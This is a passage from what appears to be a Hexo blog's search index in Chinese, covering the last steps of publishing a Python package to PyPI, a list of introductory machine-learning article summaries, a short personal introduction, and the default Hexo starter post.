COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER<br>LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,<br>OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE<br>SOFTWARE.<br></code></pre></td></tr></table></figure><ol start="2"><li><p>pyproject.toml文件</p><p>用于定义包的安装环境，并且指定安装的套件等等，类似于设置文件</p><p>官方说明：<a href="https://packaging.python.org/en/latest/tutorials/packaging-projects/#configuring-metadata">https://packaging.python.org/en/latest/tutorials/packaging-projects/#configuring-metadata</a></p><p>注意两点：</p><ul><li>包的名字不能与Pypi上已有包的名字重名</li><li>包的版本号，每次上传必须是新的</li></ul><p>例子：</p><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230716231839384.png" alt="image-20230716231839384" style="zoom: 33%;"></li></ol></li><li><p>README.md文件，即包的说明文件，md语法，会出现在Pypi网站中你上传的包的首页。</p></li></ol><p>准备好上述文件，则对项目进行封装，生成分发档案。</p><ol><li>安装build工具包</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">py -m pip install --upgrade build<br></code></pre></td></tr></table></figure><p>进入项目文件，输入指令，对项目进行封装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m build<br></code></pre></td></tr></table></figure><p>封装成功，则会在当前文件夹下生成<code>dist</code>文件夹，和<code>.whl</code>文件</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716232753827.png" alt="image-20230716232753827" style="zoom: 50%;"><p>里面存放两个包，<code>.tar.gz</code>文件</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230716232903398.png" alt="image-20230716232903398" style="zoom:50%;"><p>下一步，则是将这两个文件上传到Pypi去。使用<code>twine</code>工机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">py -m pip install --upgrade twine<br></code></pre></td></tr></table></figure><p>上传</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">py -m twine upload --repository pypi dist/*<br></code></pre></td></tr></table></figure><p>此时按照提示，输入Pypi的用户名和密码，然后上传成功。</p><h2 id="十、完结"><a href="#十、完结" class="headerlink" title="十、完结"></a>十、完结</h2><p>2023.7.16，完结撒花！🎉</p><p>肯定很多地方记的不全、也不简洁，无所谓，<strong>用到时再查文档再深入</strong>，一口吃不成大胖子，循序渐进、步步深入。</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4.16-【文章摘录】- 机器学习入门</title>
    <link href="/2023/04/16/2023.4.16-%E3%80%90%E6%96%87%E7%AB%A0%E6%91%98%E5%BD%95%E3%80%91-%20%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"/>
    <url>/2023/04/16/2023.4.16-%E3%80%90%E6%96%87%E7%AB%A0%E6%91%98%E5%BD%95%E3%80%91-%20%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>最近入门机器学习，记录一些文章及其摘录。</p><span id="more"></span><h1 id="4-16-【文章摘录】-机器学习入门"><a href="#4-16-【文章摘录】-机器学习入门" class="headerlink" title="4.16-【文章摘录】- 机器学习入门"></a>4.16-【文章摘录】- 机器学习入门</h1><p>[toc]</p><h4 id="机器学习入门"><a href="#机器学习入门" class="headerlink" title="机器学习入门"></a><a href="https://klose911.github.io/html/ml/intro.html">机器学习入门</a></h4><p>较<strong>科普性</strong>的文章，介绍了机器学习的<strong>各个方向</strong>及<strong>热门算法</strong>，对入门了解很友好。</p><blockquote><p>热门算法包括：</p><p>回归算法<br>神经网络<br>SVM算法<br>聚类算法<br>降维算法<br>推荐算法<br>其他算法</p></blockquote><h4 id="EasyAI-blog：AI知识库"><a href="#EasyAI-blog：AI知识库" class="headerlink" title="EasyAI blog：AI知识库"></a><a href="https://easyai.tech/ai-definition/">EasyAI blog：AI知识库</a></h4><blockquote><p>一个关于人工智能的综合博客</p></blockquote><h4 id="人工智能-–-Artificial-intelligence-AI"><a href="#人工智能-–-Artificial-intelligence-AI" class="headerlink" title="人工智能 – Artificial intelligence | AI"></a><a href="https://easyai.tech/ai-definition/ai/">人工智能 – Artificial intelligence | AI</a></h4><blockquote><p>人工智能<strong>科普性</strong>文章，讲述以下几点（目录）：</p><ul><li><a href="https://easyai.tech/ai-definition/ai/#what">什么是人工智能？</a></li><li><a href="https://easyai.tech/ai-definition/ai/#history">人工智能的发展历史</a></li><li><a href="https://easyai.tech/ai-definition/ai/#cant">人工智能不能做什么？</a></li><li><a href="https://easyai.tech/ai-definition/ai/#shiye">人工智能会让你失业吗？</a></li><li><a href="https://easyai.tech/ai-definition/ai/#zongjie">总结</a><ol><li>人工智能本质上是一种工具</li><li>人工智能技能只能解决特定的问题，而不是什么都能做</li><li>人工智能属于归纳逻辑，可以告诉你是什么，但是不能告诉你为什么</li></ol></li><li><a href="https://easyai.tech/ai-definition/ai/#2020">「附」2020 AI 发展趋势</a></li></ul></blockquote><h4 id="训练集、验证集、测试集（附：分割方法-交叉验证）"><a href="#训练集、验证集、测试集（附：分割方法-交叉验证）" class="headerlink" title="训练集、验证集、测试集（附：分割方法+交叉验证）"></a><a href="https://easyai.tech/ai-definition/3dataset-and-cross-validation/">训练集、验证集、测试集（附：分割方法+交叉验证）</a></h4><blockquote><p>如题，介绍基础知识，训练集、验证集、测试集。</p><p>数据分割方法：</p><ul><li>小规模样本集（几万量级），常用的分配比例是 60% 训练集、20% 验证集、20% 测试集。</li><li>大规模样本集，留 1w 验证集和 1w 测试集。</li></ul><p>同时介绍交叉验证方法</p><ul><li><strong>留出法（Holdout cross validation）</strong></li><li><strong>留一法（Leave one out cross validation）</strong></li><li><strong>k 折交叉验证（k-fold cross validation）</strong></li></ul></blockquote><h4 id="分类模型评估指标——准确率、精准率、召回率、F1、ROC曲线、AUC曲线"><a href="#分类模型评估指标——准确率、精准率、召回率、F1、ROC曲线、AUC曲线" class="headerlink" title="分类模型评估指标——准确率、精准率、召回率、F1、ROC曲线、AUC曲线"></a><a href="https://easyai.tech/ai-definition/accuracy-precision-recall-f1-roc-auc/">分类模型评估指标——准确率、精准率、召回率、F1、ROC曲线、AUC曲线</a></h4><blockquote><p>机器学习模型需要有量化的评估指标来评估哪些模型的效果更好。</p><p>本文将用通俗易懂的方式讲解分类问题的混淆矩阵和各种评估指标的计算公式。将要给大家介绍的评估指标有：准确率、精准率、召回率、F1、ROC曲线、AUC曲线。</p><p><strong>问题：</strong>不太懂F1、ROC曲线、AUC曲线。另外的指标也不熟悉。</p></blockquote><h4 id="无监督学习-–-Unsupervised-learning-UL"><a href="#无监督学习-–-Unsupervised-learning-UL" class="headerlink" title="无监督学习 – Unsupervised learning | UL"></a><a href="https://easyai.tech/ai-definition/unsupervised-learning/">无监督学习 – Unsupervised learning | UL</a></h4><blockquote><p>无监督学习是机器学习领域内的一种学习方式。本文将给大家解释他的基本概念，告诉大家无监督学习可以用用到哪些具体场景中。</p><p>最后给大家举例说明2类无监督学习的思维：聚类、降维。以及具体的4种算法</p></blockquote><h4 id="监督学习-–-Supervised-learning"><a href="#监督学习-–-Supervised-learning" class="headerlink" title="监督学习 – Supervised learning"></a><a href="https://easyai.tech/ai-definition/supervised-learning/">监督学习 – Supervised learning</a></h4><blockquote><p><strong>监督学习需要有明确的目标，很清楚自己想要什么结果</strong>。比如：按照“既定规则”来分类、预测某个具体的值…</p><p>即给数据集打上标签后，再训练模型</p></blockquote><h4 id="机器学习-–-machine-learning-ML"><a href="#机器学习-–-machine-learning-ML" class="headerlink" title="机器学习 – machine learning | ML"></a><a href="https://easyai.tech/ai-definition/machine-learning/">机器学习 – machine learning | ML</a></h4><blockquote><p>同样是<strong>科普类文章</strong>，总览<strong>介绍</strong>机器学习。</p><p>Field of study that gives computers the ability to learn without being explicitly programmed.</p><p>机器学习分为<strong>三大类</strong>：</p><ol><li>监督学习</li><li>非监督学习</li><li>强化学习</li></ol><p><strong>7个步骤</strong>：</p><p><img src="https://easyai.tech/wp-content/uploads/2018/12/7steps-ml.png" alt="机器学习的7个步骤"></p></blockquote><h4 id="深度学习-–-Deep-learning-DL"><a href="#深度学习-–-Deep-learning-DL" class="headerlink" title="深度学习 – Deep learning | DL"></a><a href="https://easyai.tech/ai-definition/deep-learning/">深度学习 – Deep learning | DL</a></h4><blockquote><p>深度学习有很好的表现，引领了第三次人工智能的浪潮。目前大部分表现优异的应用都用到了深度学习，大红大紫的 AlphaGo 就使用到了深度学习。</p><p>本文将详细的给大家介绍深度学习的基本概念、优缺点和主流的几种算法。</p></blockquote><h4 id="生成对抗网络-–-Generative-Adversarial-Networks-GAN"><a href="#生成对抗网络-–-Generative-Adversarial-Networks-GAN" class="headerlink" title="生成对抗网络 – Generative Adversarial Networks | GAN"></a><a href="https://easyai.tech/ai-definition/gan/">生成对抗网络 – Generative Adversarial Networks | GAN</a></h4><blockquote><p>生成对抗网络 – GAN 是最近2年很热门的一种无监督算法，他能生成出非常逼真的照片，图像甚至视频。我们手机里的照片处理软件中就会使用到它。</p><p>本文将详细介绍生成对抗网络 – GAN 的设计初衷、基本原理、10种典型算法和13种实际应用。</p><ul><li><p>有生成器G和判别器D</p><p>第一阶段：固定「判别器D」，训练「生成器G」（训练大概是使用强化学习）</p><p>第二阶段：固定「生成器G」，训练「判别器D」</p><p>循环阶段一和阶段二，通过不断的循环，「生成器G」和「判别器D」的能力都越来越强。</p></li></ul></blockquote><h4 id="生成性对抗网络（GAN）初学者指南-–-附代码"><a href="#生成性对抗网络（GAN）初学者指南-–-附代码" class="headerlink" title="生成性对抗网络（GAN）初学者指南 – 附代码"></a><a href="https://easyai.tech/blog/generative-adversarial-networks-gans-a-beginners-guide/">生成性对抗网络（GAN）初学者指南 – 附代码</a></h4><blockquote><p>更详细的<strong>介绍</strong>了GAN，含代码。</p></blockquote><h3 id="干货，看不懂：长文解释生成对抗网络GAN的详细原理（20分钟阅读）"><a href="#干货，看不懂：长文解释生成对抗网络GAN的详细原理（20分钟阅读）" class="headerlink" title="干货，看不懂：长文解释生成对抗网络GAN的详细原理（20分钟阅读）"></a><a href="https://easyai.tech/blog/understanding-generative-adversarial-networks-gans/">干货，看不懂：长文解释生成对抗网络GAN的详细原理（20分钟阅读）</a></h3><blockquote><p>大纲：</p><p>在下面的第一节中，我们将讨论从给定分布生成随机变量的过程。然后，在第2节中，我们将通过一个例子展示GAN试图解决的问题可以表示为随机变量生成问题。在第3节中，我们将讨论基于匹配的生成网络，并展示它们如何回答第2节中描述的问题。最后在第4节中，我们将介绍GAN。更具体地说，我们将展示具有其损失功能的一般架构，并且我们将与之前的所有部分建立链接。</p></blockquote><h4 id="AI-数据集最常见的6大问题（附解决方案）"><a href="#AI-数据集最常见的6大问题（附解决方案）" class="headerlink" title="AI 数据集最常见的6大问题（附解决方案）"></a><a href="https://easyai.tech/blog/ai-dataset-6-problem-solution/">AI 数据集最常见的6大问题（附解决方案）</a></h4><blockquote><ul><li>问题1：数据量不够</li><li>问题2：低质量的分类</li><li>问题3：低质量的数据</li><li>问题4：不平衡的分类</li><li>问题5：数据不平衡</li><li>问题6：没有验证集和测试集</li></ul></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人介绍</title>
    <link href="/2023/04/02/2-%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/04/02/2-%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>个人介绍，如何联系我。</p><span id="more"></span><p>我是一名学生</p><p>有问题加我qq：1245885144</p>]]></content>
    
    
    
    <tags>
      
      <tag>个人介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/04/01/1-hello-world/"/>
    <url>/2023/04/01/1-hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
